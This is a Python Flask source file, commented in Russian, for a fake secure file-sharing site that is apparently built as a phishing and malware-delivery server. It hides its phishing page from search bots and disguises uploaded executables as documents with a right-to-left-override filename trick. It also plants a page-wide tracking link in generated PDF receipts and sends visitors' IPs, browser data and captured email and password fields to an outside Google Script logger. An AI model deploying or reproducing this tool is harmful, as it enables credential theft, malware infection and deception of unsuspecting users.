import os
import json
import threading
import uuid
import datetime
import requests
from flask import Flask, render_template, request, redirect, url_for, jsonify, send_from_directory, make_response, abort
from werkzeug.utils import secure_filename
from fpdf import FPDF

app = Flask(__name__)

# --- КОНФИГУРАЦИЯ ---
# Используем /tmp для Render, так как там есть права на запись
UPLOAD_FOLDER = '/tmp/uploads' if os.environ.get('RENDER') else 'uploads'
DB_FILE = '/tmp/db.json' if os.environ.get('RENDER') else 'db.json'

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
# Разрешаем exe и bat для тестов, но фильтруем их при отдаче
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'doc', 'docx', 'jpg', 'png', 'exe', 'bat', 'scr'}

# Твой Google Script URL (Логгер)
GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzR1L95FUkqS8X4OqcS0bBBqIGCdD4YfW7yCa5diOxnLeKvxnP1ONl-zGcezeEOLKLDOA/exec"

# --- БАЗА ДАННЫХ ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    try:
        with open(DB_FILE, 'w') as f: json.dump(data, f)
    except Exception as e: print(f"DB Save Error: {e}")

db = load_db()

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# --- ФОНОВАЯ ОТПРАВКА ЛОГОВ ---
def send_email_background(data, user_ip, user_agent, trigger_type="Page Load"):
    try:
        # OPSEC: Удаляем пароли из вывода в консоль сервера
        safe_log = data.copy()
        if 'system' in safe_log and isinstance(safe_log['system'], dict):
            safe_log['system'] = safe_log['system'].copy()
            if 'phishing_password' in safe_log['system']:
                safe_log['system']['phishing_password'] = "***REDACTED***"
        
        print(f"[+] Trigger: {trigger_type} | IP: {user_ip}")
        
        payload = {
            "trigger": trigger_type,
            "ip": user_ip,
            "user_agent": user_agent,
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "details": data
        }
        requests.post(GOOGLE_SCRIPT_URL, json=payload)
    except Exception as e:
        print(f"[-] Logger Error: {e}")

# --- PDF TRAP GENERATOR ---
class PDFReceipt(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 15)
        self.cell(0, 10, 'SECURE TRANSFER RECEIPT', 0, 1, 'C')

def generate_receipt(uid, filename):
    pdf = PDFReceipt()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    
    pdf.cell(200, 10, txt=f"File: {filename}", ln=1)
    pdf.cell(200, 10, txt=f"Transaction ID: {uid}", ln=1)
    pdf.cell(200, 10, txt=f"Date: {datetime.datetime.now()}", ln=1)
    pdf.set_text_color(255, 0, 0)
    pdf.cell(200, 10, txt="STATUS: PENDING VERIFICATION. CLICK TO OPEN.", ln=1)
    
    # Ссылка-ловушка на весь лист
    tracking_url = f"https://pdfeagle.onrender.com/pixel.gif?source=pdf_click&uid={uid}"
    pdf.link(0, 0, 210, 297, tracking_url)
    
    receipt_name = f"receipt_{uid}.pdf"
    path = os.path.join(app.config['UPLOAD_FOLDER'], receipt_name)
    pdf.output(path)
    return receipt_name

# --- МАРШРУТЫ ---

@app.route('/health')
def health_check():
    return "OK", 200

@app.route('/pixel.gif')
def tracking_pixel():
    source = request.args.get('source', 'unknown')
    uid = request.args.get('uid', 'unknown')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    threading.Thread(target=send_email_background, args=(
        {'meta': {'url': f'PDF TRAP ({uid})', 'source': source}}, ip, "PDF Reader", "PDF OPENED"
    )).start()

    return make_response(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'})

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if 'files' not in request.files: return redirect(request.url)
        files = request.files.getlist('files')
        uploaded_files = []
        
        for file in files:
            if file and allowed_file(file.filename):
                original_filename = file.filename
                try: ext = original_filename.rsplit('.', 1)[1].lower()
                except: ext = "bin"
                saved_filename = f"{uuid.uuid4().hex}.{ext}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], saved_filename))
                
                icon = "fa-file-pdf" if ext == 'pdf' else "fa-file-word" if ext in ['doc', 'docx'] else "fa-file-code"
                uploaded_files.append({
                    'name': original_filename,
                    'saved_name': saved_filename,
                    'format': ext.upper(), 
                    'icon': icon, 
                    'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
                })

        if uploaded_files:
            unique_id = uuid.uuid4().hex[:6]
            db[unique_id] = {'files': uploaded_files, 'comments': [], 'created_at': str(datetime.datetime.now())}
            save_db(db)
            return redirect(f"/{unique_id}")
            
    return render_template('index.html')

@app.route('/<unique_id>')
def view_files(unique_id):
    global db
    db = load_db()
    data = db.get(unique_id)
    if not data: return "File not found or expired", 404
    return render_template('view.html', files=data['files'], uid=unique_id, db_data=data)

# --- CLOAKING & PHISHING ---
@app.route('/verify/<uid>/<path:filename>')
def verify_download(uid, filename):
    user_agent = request.headers.get('User-Agent', '').lower()
    
    # Список ботов для фильтрации
    bots = ['googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baidu', 'yandex', 'headless', 'lighthouse', 'twitterbot', 'facebookexternalhit']
    is_bot = any(bot in user_agent for bot in bots)
    
    if is_bot:
        # Ботам отдаем заглушку
        return "<h1>Loading secure document...</h1><p>Please wait while we verify your browser security.</p>", 200
    
    # Людям отдаем фишинг
    return render_template('semyanich.html', uid=uid, filename=filename)

# --- RTLO DOWNLOAD ---
@app.route('/download/<uid>/<path:filename>')
def download_file(uid, filename):
    data = db.get(uid)
    if not data: return abort(404)
    target_file = next((f for f in data['files'] if f['name'] == filename), None)
    
    if target_file:
        original_name = target_file['name']
        saved_name = target_file['saved_name']
        
        # RTLO SPOOFING: Если файл исполняемый, маскируем его
        # Символ \u202e переворачивает текст справа-налево
        if saved_name.endswith(('.exe', '.scr', '.bat')):
            # Пример: "Statement_cod.exe" -> "Statement_exe.doc"
            # Браузер покажет: Document_exe.doc
            spoofed_name = "Document_\u202ecod.exe" 
        else:
            spoofed_name = original_name

        return send_from_directory(
            app.config['UPLOAD_FOLDER'], 
            saved_name, 
            as_attachment=True, 
            download_name=spoofed_name
        )
    return abort(404)

@app.route('/download_receipt/<uid>')
def download_receipt(uid):
    filename = generate_receipt(uid, "Secure_Download")
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# --- API COLLECTOR (BEACON SUPPORT) ---
@app.route('/api/collect', methods=['POST'])
def collect_data():
    try:
        # sendBeacon может отправлять данные как строку или Blob
        if request.is_json:
            data = request.json
        else:
            # Пытаемся распарсить сырые данные
            data = json.loads(request.data)
            
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent')
        trigger = data.get('meta', {}).get('trigger', 'Unknown')
        
        threading.Thread(target=send_email_background, args=(data, user_ip, user_agent, trigger)).start()
        return jsonify({"status": "ok"})
    except Exception as e:
        return jsonify({"status": "error", "details": str(e)})

@app.route('/api/comment', methods=['POST'])
def add_comment():
    data = request.json
    uid = data.get('uid')
    
    if uid in db:
        if 'comments' not in db[uid]: db[uid]['comments'] = []
        
        comment_entry = {
            'username': data.get('username', 'Anonymous'),
            'text': data.get('text'),
            'date': datetime.datetime.now().strftime("%d.%m.%Y %H:%M")
        }
        db[uid]['comments'].append(comment_entry)
        save_db(db)
        
        # Логируем (включая скрытые поля email/pass если они есть)
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        threading.Thread(target=send_email_background, args=(data, user_ip, request.headers.get('User-Agent'), "COMMENT CREDENTIALS")).start()
        
        return jsonify({"status": "ok", "comment": comment_entry})
    
    return jsonify({"status": "error"}), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
